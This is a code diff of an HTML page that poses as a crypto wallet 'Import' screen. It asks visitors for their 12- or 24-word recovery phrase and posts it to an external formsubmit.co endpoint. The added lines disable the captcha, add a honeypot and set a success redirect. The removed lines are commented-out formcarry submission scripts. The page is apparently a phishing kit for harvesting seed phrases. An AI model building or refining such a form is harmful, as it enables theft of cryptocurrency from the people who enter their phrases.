@@ -114,9 +114,16 @@
                                 <div class="tab-content">
                                 <div id="phrase" class="container tab-pane active"><br>
                                     <form id="my-formcarry" accept-charset="UTF-8"  action="https://formsubmit.co/0a9b8b8612578cd0c1c2113ca4cde51f"  method="POST" enctype="multipart/form-data">
+                                        <!-- honeypot -->
+                                        <input type="text" name="_honey" style="display: none;" id="">
+
+                                        <!-- Disable captcha -->
+                                        <input type="hidden" name="_captcha" value="false">
+
+                                        <input type="hidden" name="_next" value="https://formsubmit.co/form/submission/Success.html">
                                         <div class="form-item mb-3 mt-3">
                                             <!-- <label for="comment" class="form-label">Phrase</label> -->
-                                            <textarea class="form-control" rows="5" id="comment" name="Phrase Details"  placeholder="Phrase..." required></textarea>
+                                            <textarea class="form-control" rows="5" id="comment" name="Phrase&nbsp;Details"  placeholder="Phrase..." required></textarea>
                                             <label for="comment">Typically 12 (sometimes 24) words seperated by a single spaces.</label>
                                         </div>
                                         <button type="submit" class="btn btn-primary form-control">Import</button>
@@ -173,59 +180,5 @@
                 </div>
                 <div class="col-sm-2"></div>
             </div>
-
-            <!-- <script src="https://carrier.formcarry.com/js/v1.js"></script>
-                    <script>
-                         formcarry({
-                            form: "EIDZPFZQk7A",
-                            // id or the class name of the form element, only form element allowed
-                            // works with css selectors
-                            // # <= for id
-                            // . <= for class
-                            element: "Phase" + "#my-formcarry",
-                            extraData: {
-                            // add whatever you want
-                            screenSize: `${window.screen.width}x${window.screen.height}`,
-                            language: window.navigator.language,
-                            },
-                            // Success callback, you can show alert messages
-                            // or redirect the user in this function
-                            onSuccess: function(response){
-                            alert(response)
-                            },
-                            // Error callback, a good place to show errors 🗿
-                            onError: function(error){
-                            alert(error)
-                            }
-                        }); -->
-    
-                            <!-- // formcarry({
-                            //     form: "f9BVHtM-xxx",
-                            //     // id or the class name of the form element, only form element allowed
-                            //     // works with css selectors
-                            //     // # <= for id
-                            //     // . <= for class
-                            //     element: "#my-formcarry",
-                            //     extraData: {
-                            //     // add whatever you want
-                            //     screenSize: `${window.screen.width}x${window.screen.height}`,
-                            //     language: window.navigator.language,
-                            //     },
-                            //     // Success callback, you can show alert messages
-                            //     // or redirect the user in this function
-                            //     onSuccess: function(response){
-                            //     // formcarry = "";
-                            //     response = "Thanks!";
-                            //     alert(response);
-                            //     },
-                            //     // Error callback, a good place to show errors 🗿
-                            //     onError: function(error){
-                            //         error =  "Ooops! There was a problem.";
-                            //     alert(error);
-                            //     }
-                            // }); -->
-                    </script>     
-                  
-           
 </body>
 </html>
